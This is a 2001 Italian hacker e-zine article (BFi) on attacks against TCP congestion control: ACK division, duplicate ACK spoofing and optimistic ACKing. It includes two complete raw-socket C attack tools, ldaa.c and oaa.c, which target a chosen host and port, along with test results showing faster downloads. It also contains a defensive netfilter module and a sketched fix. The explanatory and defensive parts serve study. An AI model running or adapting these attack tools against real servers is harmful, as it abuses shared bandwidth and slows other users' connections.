@@ -1,0 +1,877 @@
+==============================================================================
+-----------[ BFi numero 10, anno 4 - 30/09/2001 - file 8 di 18 ]--------------
+==============================================================================
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ TCP C0NGESTi0N C0NTR0L E DiNT0RNi
+-----[ vecna <vecna@s0ftpj.org>
+
+
+keyword: tcp congestion, netfilter module, congestion attack, congestione tcp
+
+-- P R E F A Z I O N E --
+
+nel 2000 dei tizi descrissero un attacco un po' particolare: questo attacco 
+era finalizzato ad incrementare la velocita` di download di un host che
+invia i dati. e` spiegato dettagliatamente nel documento intitolato:
+"TCP Congestion Control with a Misbehaving Receiver" di Stefan Savage, 
+Neal Cardwell, David Wetherall e Tom Anderson
+reperibile a http://www.cs.washington.edu/homes/savage/papers/CCR99.pdf
+
+il doc xo` si conclude con un paio di preoccupanti paragrafi che dicono:
+
+1) i sistemi operativi vulnerabili ai 3 attacchi sono praticamente TUTTI
+   tranne per il primo attacco che puo` essere evitato (e linux 2.2 gia` e`
+   fixato come molti altri SO ormai...);
+2) non e` possibile scrivere patch xke` non e` un bug di implementazione, ma
+   e` intrinseco del protocollo TCP e del suo controllo della congestione,
+   per controllarlo bisognerebbe aggiungere un campo nell'header tcp
+   (e suggeriscono come utilizzarlo)
+
+dopo questo periodo cmq nessuno ne parla e non appare niente, ne` nei 
+ChangeLogs ne` nei commenti dei sorgenti dei kernel ne` da altre parti: si
+tratta di vulnerabilita` ancora presenti nei nostri kernel :)
+
+-- I N T R O D U Z I O N E --
+
+supponiamo che client.foo.com si colleghi a www.mp3.gov e inizi il download
+di un file:
+
+	[un po` dopo il 3 way handshake...]
+05:03:19.365419 www.mp3.gov.www > client.foo.com.2761: P 21721:23169(1448) 
+		ack 333 win 32120 <nop,nop,timestamp 30645578 6530382> (DF)
+05:03:19.365998 client.foo.com.2761 > www.mp3.gov.www: . ack 23169 win 30408 
+		<nop,nop,timestamp 6530633 30645578> (DF)
+05:03:19.655411 www.mp3.gov.www > client.foo.com.2761: P 23169:24617(1448) 
+		ack 333 win 32120 <nop,nop,timestamp 30645603 6530411> (DF)
+05:03:19.655996 client.foo.com.2761 > www.mp3.com.www: . ack 24617 win 30408 
+		<nop,nop,timestamp 6530662 30645603> (DF)
+	[...]
+
+cosa succede?
+il server invia un pacchetto con dei dati di una certa grandezza (la size del
+pacchetto la vediamo tra parentesi, in questo caso sono entrambi 1448), prima
+della size vediamo l'ack_seq, ovvero l'acknowledge sequence number, un
+campo di 32 bit che sta nell'header tcp contenente un numero, questo numero
+e` la base in modo che l'altro host, per notificare la ricezione del 
+pacchetto, risponda con un ack con un ack_seq pari a quello contenuto nel
+pacchetto con i dati piu` il numero di dati; li` vedete xo`:
+
+21721:23169
+
+che e` una convezione di tcpdump(8) per indicare che questo pacchetto ha 
+ack_seq di 21721, ma visto che e` grosso 1448 byte ci si aspetta una ack di 
+risposta con ack_seq settato a 21721+1448=23169.
+(attenzione se fate parser di rete per test, bisogna convertire questi valori
+con htonl(3) e ntosl(3))
+
+mi pare scontato che i dati viaggino in pacchetti con flag PUSH settato (come
+fa capire la lettera 'P' nella riga di tcpdump) e che i pacchetti che chiamo
+ack abbiano il flag ACK settato.
+
+-- E   L A   C O N G E S T I O N E   ? --
+
+(rapido, ci sono le rfc)
+
+ci sono alcune variabili locali di vario genere che interagiscono con gli
+algortimi di congestione, sono:
+
+SMSS: Sender Maximum Segment Size, quantita` massima di dati inviabile
+(escluso dagli header ip/ip options/tcp, solo i dati), dipendente dall'MTU
+(Maximal Tranfer Unit) che a sua volta dipende dal tipo di interfaccia.
+
+RMSS: Recevider Maximum Segment Size, vedi sopra.
+
+RWND: Receiver Window, valore del campo window dell'header tcp ricevuto per
+ultimo.
+
+CWND: Congestion Window, valore che limita la grandezza di dati inviabili in
+un solo pacchetto.
+
+durante una connessione iniziata ogni volta che un pacchetto viene notificato
+con un ACK la grandezza del pacchetto successivo puo` aumentare in relazione
+alla RWND e alla CWND, e puo` diminuire ogni qualvolta venga notificata una
+perdita (con un icmp di errore o perche` l'attesa dell'ACK raggiunge un
+timeout che causa il riinvio del pacchetto).
+
+a questo punto sembrerebbe che la velocita` del download dipenda 
+esclusivamente dalla grandezza della window, ma non e` *solo* questo, 
+all'inizio di un trasferimento si segue un algoritmo chiamato di "partenza
+lenta" ovvero, prima di raggiungere la stabilita` della connessione, non solo
+la window size viene aumentata, ma il numero di pacchetti inviati raddoppia
+ogni volta finche` non si stabilizza ai livelli ottimali.
+
+gli attacchi spiegati vengono portati durante la partenza lenta per aver
+risultati migliori, ma anche durante la connessione stabilizzata si notano
+migliorie; i test che ho fatto sono stati effettuati durante la connessione
+gia` iniziata.
+
+come toccare con mano?
+
+/usr/src/linux/include/net/sock.h: line 243 of 1310 [18%] trovate la struct
+tcp_opt che contiene TUTTO, tutte le variabili indicate, stati, timeout,
+puntatori a vita morte e miracoli della connessione...
+
+in /usr/src/linux/include/net/tcp_ecn.h e tcp.h ci sono tutte le macro alle
+funzioni del kernel che lavorano sulla tcp_opt, quindi anche parecchie 
+inerenti alla congestione.
+
+-- F U N Z I O N A M E N T O   D E G L I   A T T A C C H I --
+
+(nelle descrizioni saro` abbastanza superficiale visto che c'e` sia quel doc,
+sia la traduzione in italiano fatta da antirez su un numero di Linux&c.)
+
+come detto, l'rfc2581 indica tra le altre cose: "durante la partenza lenta,
+si incrementa la congestion window size in relazione al numero di ack
+ricevuti", quindi gli attacchi mireranno a far ricevere un numero di ack
+superiore a quelli classici in modo da incrementare il download.
+la parte di codice vulnerabile non e` altro che nelle routine a basso livello
+di connect() send*() write() read() applicate a socket TCP, il kernel gestisce
+la velocita` di spedizione e la grandezza dei pacchetti, essa aumenta in
+relazione agli algo di congestione, direttamente dipendente dal numero di ACKs
+ricevuti e diminuisce nel caso qualche pacchetto vada perso ( = l'ack atteso
+vada in timeout) o venga notificata la congestione in uno dei 3 sistemi che
+dopo vedremo.
+
+a) ack division
+
+semplicemente anziche` notificare il ricevimento di tutti i 1448 byte con un 
+ack solo uso + di un ack per notificarlo, ovvero...:
+se ho ricevuto i dati con ack_seq a 21721, potro` notificarlo prima con
+21722 poi con 21723 poi con 21823 e poi con 23169, ovvero, prima ho notificato
+la ricezione di 1 byte, poi di un altro, poi di 100, e poi di quelli che
+rimanevano...
+questa pratica non e` prevista nell'rfc, ma non e` sbagliata, il numero di
+ACKs ricevuto sara` superiore e l'incremento della CWND sara` notevole.
+
+per scrivere un sw che svolga quest'attacco sono possibili 2 metodi:
+
+1) pacciare il kernel nelle routine di basso livello per un notifica divisa
+   e stop, la + pulita che si puo` fare, solo che bisogna lavorare con
+   funzioni che non hanno simboli esportati e puo` non essere semplicissimo;
+   le parti di codice relative per linux 2.4 sono in net/ipv4/tcp_output.c
+   tra i src del kernel;
+2) lavorare a datalink layer come visto e strarivisto su phrack e su BFi, o
+   manipolando uno dei layer di netfilter (linux 2.4) o per BSD come spiegato 
+   dal buon pIG creando una chain di mbuf contenenti gli ACKs intermenti e 
+   attaccandole nella queue prima della notifica completa.
+X) purtroppo non si puo` lavorare in userspace come invece si puo` fare nel
+   caso degli altri 2 attacchi perche` bisogna necessariamente inserirsi prima
+   dell'ack che notifica tutto il pacchetto, e si puo` fare solo in
+   kernelspace.
+
+b) dup ack spoofing
+
+come gia` detto quando numerose volte (spesso quando si parlava di shell e
+canali di comunicazione occulti che con grande stupore anche SANS riporta:
+http://www.s0ftpj.org/docs/covert_shells.htm :) il protocollo layer 3 alla
+base di tutto e` l'IP, connectionless, con problemi ad esso legati...
+la possibilita` di essere perso, di essere duplicato, di essere veloce, di 
+non essere legato a una sequenza ecc... toh, c'e` scritto "duplicato" :) 
+questo significa che e` possibile e non difficilmente verificabile che uno
+degli ACK che invio come riscontro venga duplicato da un router intermedio,
+ma come detto da rfc2581 "in relazione al numero di ack ricevuti aumenta la 
+velocita` in fase di partenza lenta" quindi se noi piazziamo un programmino 
+che gira in userspace e quando vede un ack passare lo riinvia un certo 
+numero di volte... non c'e` nessun male... e il download aumenta :)
+
+<-| congestion/ldaa.c |->
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <err.h>
+
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <arpa/inet.h>
+#include <net/if.h>
+#include <net/if_arp.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+
+extern int errno;
+static struct sockaddr_in sin;
+static int ss;
+
+void send_dupack(void *, unsigned char);
+
+#define MAS	128			/* Max Ack Size */
+
+int main(int argc, char **argv)
+	{
+        struct ifreq ifr;		/* interface query struct */
+	int sfd, nt, nd, off, hdr =1;	/* socket, number time to apply dup,
+					 * number of dup, datalink offset */
+	unsigned int daddr;		/* dest addr to check */
+	unsigned short port;		/* dest port to check */
+
+	printf( " ldaa - lamer dup ack attacker - by vecna@s0ftpj.org\n");
+
+	if(argc != 6)
+		{
+		fprintf(stderr,
+			" usage: %s host port iface n.dup n.times\n" 	\
+			" %s:\tis ldaa this program ...\n" 		\
+			" host:\t\thost to attack, only IP " 		\
+			"addess accepted, not implemented resolv\n" 	\
+			" port:\t\tdestination port to attack\n" 	\
+			" iface:\t\tinterface used for reach host\n" 	\
+			" n.dup:\t\tnumber of ack duplication\n" 	\
+			" times:\t\tnumber of time to apply duplication\n",
+			argv[0], argv[0]
+			);
+		err(EINVAL, "no such argument");
+		}
+
+	memset(&ifr, 0, sizeof(struct ifreq));
+
+	nt =atoi(argv[5]);
+	nd =atoi(argv[4]);
+	daddr =inet_addr(argv[1]);
+	port =htons(atoi(argv[2]));
+
+	sin.sin_port =port;
+	sin.sin_addr.s_addr =daddr;
+	sin.sin_family =AF_INET;
+
+	if((sfd =socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) ==-1)
+		err(errno, "socket on datalink layer");
+
+	if((ss =socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) ==-1)
+		err(errno, "socket on raw sock layer");
+
+	if(setsockopt(ss, IPPROTO_IP, IP_HDRINCL, &hdr, sizeof(hdr)) ==-1)
+		err(errno, "setsockopt IP_HDRINCL");
+
+	strncpy(ifr.ifr_name, argv[3], sizeof(ifr.ifr_name));
+
+	if(ioctl(sfd, SIOCGIFHWADDR, &ifr) == -1)
+		err(errno, "ioctl SIOCGIFHWADDR of %s", argv[3]);
+
+	switch(ifr.ifr_hwaddr.sa_family)
+		{
+		case ARPHRD_ETHER:
+		case ARPHRD_METRICOM:
+		case ARPHRD_EETHER:
+			off =14;
+			break;
+		case ARPHRD_PPP: 
+			off =0;
+			break;
+		case ARPHRD_LOOPBACK:
+			off =4;
+			break;
+		default:
+			err(ENODEV, "unknow linktype for device %s", argv[3]);
+		}
+
+	while(nt)
+		{
+		char packet[MAS];
+		static unsigned int ack_seq;
+		struct iphdr *ip;
+		struct tcphdr *tcp;
+		int nbyte;
+
+		if((nbyte =read(sfd, &packet, MAS)) ==-1)
+			err(errno, "read on datalink layer");
+	
+		(char *)ip =(char *)&packet +off;
+
+		if(ip->protocol != IPPROTO_TCP || ip->daddr !=daddr)
+			continue;
+
+		(char *)tcp =(char *)ip +sizeof(struct iphdr);
+
+		if(tcp->dest !=port)
+			continue;
+
+		if(tcp->ack && !tcp->syn && !tcp->rst && tcp->ack_seq !=ack_seq)
+			{
+			int cnt;
+
+			printf(" dup seq %u ack %u\n", tcp->seq, tcp->ack_seq);
+			for(cnt =0; cnt !=nd; cnt++)
+				{
+				printf(" cnt %d nd %d nt %d\n", cnt, nd, nt);
+				send_dupack((void *)ip, ntohs(ip->tot_len));
+				}
+
+			nt--;
+			ack_seq =tcp->ack_seq;
+			}
+		}
+
+	exit(EXIT_SUCCESS);
+	}
+
+void send_dupack(void *pkt, unsigned char len)
+	{
+	if(sendto(ss, pkt, len, 0x0000, &sin, sizeof(sin)) ==-1)
+		err(errno, "error on sending ack packet");
+	}
+<-X->
+
+scenario del funzionamento:
+apro una dcc con una adsl e mi stabilizzo sui 4.7k di upload, dalla adsl il
+numero di notifiche aumenta e cosi` pure i k di upload andando fin oltre i
+6.2k (poi ho interrotto la dcc). l'aumento della velocita` e` abbastanza 
+poporzionale al numero di ACKs duplicati, qui sotto vedete ldaa all'opera.
+
+P.S.: se pubblico i codici di attacco e` anche xke` ho studiato come fixarli.
+ri-P.S.: ringrazio yawn x tutti i test di congestione che le ho fatto fare :P
+
+arkmp:/home/vecna/wrk/my/tcc# ./ldaa
+ ldaa - lamer dup ack attacker - by vecna@s0ftpj.org
+ usage: ./ldaa host port iface n.dup n.times
+ ./ldaa:        is ldaa this program ...
+ host:          host to attack, only IP addess accepted, not implemented resolv
+ port:          destination port to attack
+ iface:         interface used to reach host
+ n.dup:         number of ack duplication
+ times:         number of time to apply duplication
+ldaa: no such argument: Successo
+
+e` un programma che gira in userspace come detto prima, basta avviarlo e poi
+ci pensera` lui a mettersi a datalink layer, selezionare tutti i pacchetti che
+sono spediti verso l'host che vogliamo congestionare (il primo argomento)
+verso il servizio da cui scarichiamo (secondo) che passano attraverso 
+l'interfaccia su cui ascoltiamo (come terzo argomento) che abbiano SOLO il
+flag ACK settato, in questo caso per un numero di volte pari all'ultimo
+argomento rispedira` l'ack di turno per un numero di volte pari al penultimo
+argomento.
+
+nei test fatti avevo come parametri finali 2 e 10 e + tardi, visto che
+aumentava di poco ne e` stato avviato un secondo con 2 20.
+
+c) optimistic acking
+
+un attacco mui interessante. il receiver deve predirre la grandezza del
+prossimo pacchetto inviato (relativamente facile) e inviare l'ack di
+risposta PRIMA che sia stato ricevuto, ma attenzione, deve essere l'ack di un
+pacchetto gia` inviato (altrimenti un qualunque kernel se riceve una notifica 
+quando un pacchetto non e` ancora stato inviato potrebbe offendersi -> 
+scartare il vostro ack :) gia` inviato, ma non ancora ricevuto: in questo modo
+noi sembreremo solo un server rapidissimo che risponde in modo quasi
+immediato. 
+
+(nota sull'implementazione)
+
+anche questo codice (oaa) gira in userspace, anzi, e` ottenuto modificando 
+ldaa, e puo` mandare un numero di ACKs predetti dopo aver "guessato" la 
+grandezza del pacchetto sperando sia di azzeccare la size, sia che il 
+pacchetto sia gia` stato inviato, sia che il pacchetto arrivi xke` se arriva
+una notifica esatta il pacchetto non puo` + essere ritrasmesso, e se arriva
+rovinato o se non arriva e` perso salvo casi in cui il protocollo a layer 5
+non consenta ritrasmissioni e resume di sorta.
+l'oaa (optimistic acking attacker) predice gli ACKs, ma non blocca l'invio 
+degli ACKs normali del kernel, quindi oltre che a rispondere decisamente
+prima (e questo secondo test ha dato performance nettamente + potenti di
+ldaa!) avremo anche un duplicazione per ogni ack da noi mandato relativo a un
+pacchetto gia` inviato.
+
+c'e` da dire che se si invia l'ack di un pacchetto e a voi non arriva o arriva
+rovinato ecc... l'avete perso x sempre, anche se nel doc indica come in alcuni
+casi, alcuni protocolli di layer 5 consentano di resumare una trasmissione o
+di farsi riinviare solo alcune parti di dato.
+
+<-| congestion/oaa.c |->
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <err.h>
+
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <arpa/inet.h>
+#include <net/if.h>
+#include <net/if_arp.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+
+extern int errno;
+
+static struct sockaddr_in sin;
+static unsigned int l_ack;
+static int ss, ns;
+
+unsigned short sum(unsigned short *, int);
+void ssoa(void *, struct tcphdr *, size_t, int);
+
+#define MAS	128			/* Max Ack Size */
+
+int main(int argc, char **argv)
+	{
+        struct ifreq ifr;		/* interface query struct */
+	int sfd, off, wa, hdr =1;	/* socket, number time to apply dup,
+					 * number of dup, datalink offset */
+	unsigned int daddr;		/* dest addr to check */
+	unsigned short port;		/* dest port to check */
+
+	printf(" optimistic acking attacker - by vecna@s0ftpj.org\n\n");
+
+	if(argc != 6)
+		{
+		fprintf(stderr,
+			" usage: %s host port iface n.spoof n.wait\n" 	\
+			" host:\thost to attack, only IP" 		\
+			" address accepted, not implemented resolv\n" 	\
+			" port:\tdestination port to attack\n" 		\
+			" iface:\tinterface used for reach host\n" 	\
+			" n.add:\tnumber of ack to spoof\n" 		\
+			" w.ack:\tnumber of ack to ignore before"	\
+			" guess size\n", argv[0]);
+		err(EINVAL, "no such argument");
+		}
+
+	memset(&ifr, 0, sizeof(struct ifreq));
+
+	daddr =inet_addr(argv[1]);
+	port =htons(atoi(argv[2]));
+	ns =atoi(argv[4]);
+	wa =atoi(argv[5]);
+
+	sin.sin_port =port;
+	sin.sin_addr.s_addr =daddr;
+	sin.sin_family =AF_INET;
+
+	if((sfd =socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) ==-1)
+		err(errno, "socket on datalink layer");
+
+	if((ss =socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) ==-1)
+		err(errno, "socket on raw sock layer");
+
+	if(setsockopt(ss, IPPROTO_IP, IP_HDRINCL, &hdr, sizeof(hdr)) ==-1)
+		err(errno, "setsockopt IP_HDRINCL");
+
+	strncpy(ifr.ifr_name, argv[3], sizeof(ifr.ifr_name));
+
+	if(ioctl(sfd, SIOCGIFHWADDR, &ifr) == -1)
+		err(errno, "ioctl SIOCGIFHWADDR of %s", argv[3]);
+
+	switch(ifr.ifr_hwaddr.sa_family)
+		{
+		case ARPHRD_ETHER:
+		case ARPHRD_METRICOM:
+		case ARPHRD_EETHER:
+			off =14;
+			break;
+		case ARPHRD_PPP: 
+			off =0;
+			break;
+		case ARPHRD_LOOPBACK:
+			off =4;
+			break;
+		default:
+			err(ENODEV, "unknow linktype for device %s", argv[3]);
+		}
+
+	printf(" reading packet len...\n");
+
+	while(1)
+		{
+		char packet[MAS];
+		struct iphdr *ip;
+		struct tcphdr *tcp;
+		static int inc, i;
+		int nbyte;
+
+		if((nbyte =read(sfd, &packet, MAS)) ==-1)
+			err(errno, "read on datalink layer");
+	
+		(char *)ip =(char *)&packet +off;
+
+		if(ip->protocol !=IPPROTO_TCP || ip->daddr !=daddr)
+			continue;
+
+		(char *)tcp =(char *)ip +sizeof(struct iphdr);
+
+		if(tcp->dest !=port)
+			continue;
+
+		if(tcp->ack && !tcp->syn && !tcp->rst)
+			{
+			int chk =ntohl(tcp->ack_seq) -ntohl(l_ack);
+
+			if(!l_ack)
+				{
+				l_ack =tcp->ack_seq;
+				continue;
+				}
+
+			if(!chk)
+				continue;
+
+			printf(" %u", chk);
+
+			if(chk ==inc)
+				{
+				if(++i ==wa)
+					ssoa(ip, tcp, ntohs(ip->tot_len), inc);
+				}
+			else
+				{
+				printf("\n %d packet's size check after %d "
+					"reset for %d byte\n" ,inc, i +1, chk);
+				inc =chk;
+				i =0x0000;
+				}
+
+			l_ack =tcp->ack_seq;
+			}
+		}
+	}
+
+void ssoa(void *pkt, struct tcphdr *x, size_t len, int size)
+	{
+	int k =0x0000;
+
+	printf("\n guessed packets len [%d]\n sending ACKs: ", size);
+
+	while(k != ns)
+		{
+		x->ack_seq +=htonl(size* ++k);
+
+		/* rotfl, kernel fix my tcp checksum because here is bad */
+		x->check =sum((unsigned short *)x, sizeof(struct tcphdr));
+		/* pseudo header s000ka */
+
+		printf(".");
+
+		if(sendto(ss, pkt, len, 0x0000, &sin, sizeof(sin)) ==-1)
+			err(errno, "error on sending ack packet");
+		}
+
+	printf(" done.\n");
+	exit(EXIT_SUCCESS);
+	}
+
+unsigned short sum(unsigned short *hdr, int nw)
+	{
+	unsigned long ret =0x0000;
+
+	while(nw > 0)
+		{
+		ret += *hdr++;
+		nw -= 2;
+		}
+
+	ret = (ret >> 16) + (ret & 0xffff);
+	ret += (ret >> 16);
+
+	return ~(ret);
+	}
+<-X->
+
+sebbene gli ACKs relativi a pacchetti non ancora inviati vengano scartati al
+volo dal kernel, quando abbiamo fatto i test abbiamo usato 4 e 6 e poi 3 e 6
+come ultimi 2 valori, ovvero... la grandezza del pacchetto veniva guessata 
+con 6 check (quindi 6 pacchetti di fila dovevano aver la stessa grandezza)
+e una volta decisa si sarebbero inviati prima 4 e poi 3 ACKs di notifica
+anticipata (pur sapendo che non tutti sarebbero serviti, ma abbondare e`
+meglio che deficere...)
+
+nei test fatti con aoo la velocita` della connessione da 4.5k era passata a
+7.5k :)
+
+-- S I T U A Z I O N I   V U L N E R A B I L I --
+
+con oaa e ldaa non avete in mano del codice magico che portera` i vostri
+download a 15k al secondo su un modem 14.4 :)
+questi attacchi funzionano in quelle situazioni in cui NON tutta la banda su
+tutto il tracciato del trasferimento viene utilizzato e la velocita` e`
+regolata dall'host sender, ovvero... se stiamo scaricando a 3k al secondo e
+siamo collegati con aruba, la stessa aruba che ha un lag a "onde" per ovvi
+problemi al router, la velocita` di quel download non potra` mai aumentare
+xke` non dipende tanto dall'host che invia, quanto dall'host che riceve, se
+noi mandiamo + ack in risposta facendo aumentare... i pacchetti inviati si
+fermeranno al router in attesa insieme a tutti gli altri, il nostro download
+non sara` velocizzato (il ritardo e` nello smistamento nell'ultimo o nel
+penultimo hop in questo caso) e anzi, se insisteremo con il forzare il server
+a mandarci pacchetti + in fretta e` facile che il router nostro se ne accorga
+e gli notifichi la congestione con uno dei 3 metodi possibili: in questo caso
+un icmp di source quench
+
+in net/ipv4/tcp_input.c tra i commenti di una funzione...
+
+ * "CWR"        CWND was reduced due to some Congestion Notification event.
+ *              It can be ECN, ICMP source quench, local device congestion.
+
+ovvero:
+1) ECN = Explicit Congestion Notification, settato con uno dei flag 
+   inutilizzati dal TCP;
+2) ICMP source quench = icmp di errore specificatamente creato per notificare
+   un'eccessiva velocita` di ricezione;
+3) local device congestion = la scheda di rete o il modem che non ci sta` +
+   dietro :)
+
+questo attacco puo` andare in situazioni in cui la banda non e` utilizzata del
+tutto, O e` utilizzata quasi al limite del server attaccato facendogli
+rallentare le altre connessioni e favorendo la nostra.
+
+i test che ho fatto erano nelle seguenti condizioni:
+
+- 5 di mattina, quindi un traffico irrisorio sui router
+- io da un modem 56k inviavo
+- l'attacco veniva portato da una adsl che scaricava
+
+ed e` funzionato sia xke` non viene utilzzata tutta la banda in upload, sia
+xke` una adsl ha molta + banda di me e quindi poteva reggere un trasferimento 
+accellerato.
+
+nel caso ci fosse in mezzo qualche traffic shaper il sw non funzionerebbe (xke`
+il tc farebbe il suo lavoro) e nel caso il tc fosse sulla macchina attaccata
+non andrebbe ugualmente xke` il tc lavora a un altro livello e in modo 
+indipendente.
+probabilmente anche nel caso di firewall statefull entrambi gli attacchi
+potrebbero essere limitati, nel caso di oaa solo che il fw l'abbiamo noi
+davanti, se l'host remoto riceve i pkt anticipati li accetta cmq (anche se le
+varie opzioni di debug possono far notare ACKs anticipati o troppi
+duplicati).
+
+-- F I X --
+
+come dicevo, dal documento originale si legge:
+
+"questo problema non puo` essere patchato xke` intrinseco nel protocollo TCP
+stesso, andrebbe aggiungo un campo TCP addizionale che utilizzi dei numeri di
+sequenza univoci e random, chiamato "nonce": questo campo nonce sarebbe
+creato in modo univoco e random dal sender (quando invia il PUSH) e sarebbe
+riportato poi nell'ACK di risposta".
+
+questo campo "nonce" vedrebbe il suo funzionamento sia per fixare il
+dup ack spoofing (xke` una volta ricevuto un pkt con nonce tutti gli altri
+uguali verrebbero scartati) e l'optimistic acking attack, xke` non potrebbe
+essere predetto.
+
+io onestamente non capisco come mai si debba complicarsi cosi` la vita, forse
+xke` prima ancora di arrivare alle soluzioni proposte avevo gia` "visto" come
+poter fixare questi attacchi...
+
+                         [ anti dup ack attack ]
+
+tenedo conto dei campi tcp 'window' 'ack_seq' e 'seq' e di ip 'id' creare un
+piccolo array in cui mettere gli ultimi N ack ricevuti in modo da poter
+verificare l'arrivo di un duplicato.
+
+i duplicati vengono accettati xke` causati da errori di rete, quindi niente di
+male, ma essendo figli di errori, perche` non scartarli?
+
+anziche` memorizzare quei 4 campi per un totale di 96byte, basta fare un hash
+di seq + ack_seq + una variabile a 32 bit i cui primi 16 sono l'id, i secondi
+sono la window size. l'hash e` fatto semplicemente con un XOR dei 3 valori, in
+questo modo si avra` un'allocazione perenne di kernel memory di 4 byte per il
+numero di ack di cui viene tenuta traccia.
+
+l'ho sviluppato con un modulo x netfilter che aggiunge un hook che checka gli
+ack in arrivo alla macchina locale. 
+
+<-| congestion/adaa.c |->
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/socket.h>
+#include <linux/in.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+
+#include <linux/netdevice.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+
+#include <linux/skbuff.h>
+#include <linux/spinlock.h>
+#include <linux/version.h>
+#include <linux/brlock.h>
+
+#define ACK_QUEUE_LEN	8
+
+#define tcpseq		h.th->seq
+#define tcpackseq	h.th->ack_seq
+#define tcpwin		h.th->window
+#define ipid		nh.iph->id
+
+static struct nf_hook_ops ack_hook;
+static unsigned int ack_seq_ack[ACK_QUEUE_LEN];
+static unsigned int make_unique_unsigned(struct sk_buff *);
+
+static unsigned int ack_adaa(	unsigned int hooknum,
+				struct sk_buff **skb,
+				const struct net_device *in,
+				const struct net_device *out,
+				int (*okfn)(struct sk_buff *))
+	{
+	static unsigned int target;
+	register unsigned int i, check;
+
+	if((*skb)->nh.iph->protocol !=IPPROTO_TCP)
+		return NF_ACCEPT;
+
+	if((*skb)->h.th->ack && !(*skb)->h.th->syn && !(*skb)->h.th->rst)
+		return NF_ACCEPT;
+
+	check =make_unique_unsigned(*skb);
+
+	for(i =0x0000; i !=ACK_QUEUE_LEN; i++)
+		if(ack_seq_ack[i] ==check)
+			return NF_DROP;
+
+	ack_seq_ack[target] =check;
+
+	if(target ==ACK_QUEUE_LEN -1)
+		target =0x0000;
+	else
+		target++;
+
+	return NF_ACCEPT;	
+	}
+
+int init_module(void)
+	{
+	int ret;
+
+	ack_hook.list.next =NULL;
+	ack_hook.list.prev =NULL;
+	ack_hook.pf =PF_INET;
+	ack_hook.hook =ack_adaa;
+	ack_hook.hooknum =NF_IP_LOCAL_IN;
+
+	printk(KERN_INFO "mod for fix dup ack attack - by vecna@s0ftpj.org\n");
+
+	if(ret =nf_register_hook(&ack_hook))
+		printk(KERN_INFO "unable to add ack_hook on input flow\n");
+
+	return ret;
+	}
+
+void cleanup_module(void)
+	{
+	nf_unregister_hook(&ack_hook);
+
+	printk(KERN_INFO "unloading anti dup ack attack module\n");
+	}
+
+static unsigned int make_unique_unsigned(struct sk_buff *skb)
+	{
+	unsigned int intermediate;
+
+	memcpy(&intermediate, &skb->ipid, 2);
+	memcpy(((char *)&intermediate +2), &skb->tcpwin, 2);
+
+	return (skb->tcpseq ^ skb->tcpackseq ^ intermediate);
+	}
+<-X->
+
+                    [ optimistic acking attack patch ]
+
+il problema e` che l'attacco non e` fatto da ACK di pacchetti NON ancora 
+inviati, ma solo di pacchetti non ancora ricevuti, il grafichetto nel 
+documento originale fa` tristemente capire meglio, c'e` un motivo se quello
+e` .pdf o .ps, BFi e` un file di testo quindi niente immagine :). il punto
+saliente e` che azzeccare un ack durante la slow start significa far
+aumentare il numero di pacchetti e la congestion window di una velocita` 
+impressionante se si considera che l'ack arriva appena dopo l'invio del dato, 
+lo stack remoto notera` immeditamente che la risposta e` arrivata con un RTT 
+decisamente + basso e questo influenzera` la nostra connessione in modo 
+eccezionale :)
+
+tutto questo non e` molto chiaro, ma mette in luce che nulla si puo` fare se
+non fare un fix simile a quello usato tempo fa` per l'ip spoofing, noi
+anziche` mettere un campo random come proposto (il "nonce") faremo variare di
+poco e in modo random la window size, in modo che non sara` possibile predirre
+la grandezza del dato trasmesso, e notifiche inferiori a quella esatta non
+verranno accettate xke` come fix dell'ack division non si accettano notifiche
+divise, e ack di un numero di dati superiore non puo` essere accettato xke`
+si parla di notifica di dati non ancora inviati.
+
+problemi e possibili attacchi?
+
+la perdita di performance e` assente, ma, se come delta di variamento teniamo
+8 byte in + o in -, il receiver per predirlo dovra` inviare 16 ACKs di cui 15 
+errati e uno giusto: questo non e` bello xke` cmq un attacker con una banda in
+upload garantita e separata da quella in download (tipo adsl) potrebbe inviare
+i 16 ack possibili, per ovviare a questo basterebbe far rallentare il download
+nel caso vengano ricevuti ACKs errati, come una sorta di "punizione" :), ma
+penso sia inutile, si potrebbe aumentare la variazione possibile della window
+di 10 byte in + o in - (la window non e` mica detto che debba essere fissa, e`
+a discrezione del sender ed essa cambia in relazione agli algoritmi di
+congestione ... basta che noi cosi` facendo inseriamo un poco di entropia
+dentro quei calcoli in modo da tener il risultato pressoche` simile, ma
+difficilmente predicibile)
+
+il codice?
+
+purtroppo l'interesse per altre cose ha preso il sopravvento e soprattuto la
+settimana di esami prima dell'hackit, quindi non posso fornire alcun codice 
+dimostrativo della patch. probabilmente si puo` dirottare una delle funzioni
+(senza simbolo esportato, quindi riferendosi al paper di Silvio Cesare
+"internal function kernel hijacking" o un nome simile reperibile a
+http://www.big.net.au/~silvio ) dove si calcola l'Effective Window da
+utilizzare e variare il suo valore con un delta di ~ 20 byte verificando che
+non superi l'SMSS; per il valore random basta riferirsi alle kernel API
+implementate in ~linux/drivers/char/random.c
+
+-- T E S T I   E   D O C U M E N T I   U T I L I --
+
+	TCP Congestion Control with a Misbehaving Receiver
+	Stefan Savage, Neal Cardwell, David Wetherall, Tom Anderson
+
+	rfc2581 M. Allman, NASA Glenn/Sterling Software, ACIRI/ICSI,
+	W. Stevens (si`, Lui :)
+
+	/usr/src/linux/include/linux/netfilter*
+
+	EXCEL SAGA - martedi` sera Mtv ore 22:00
+
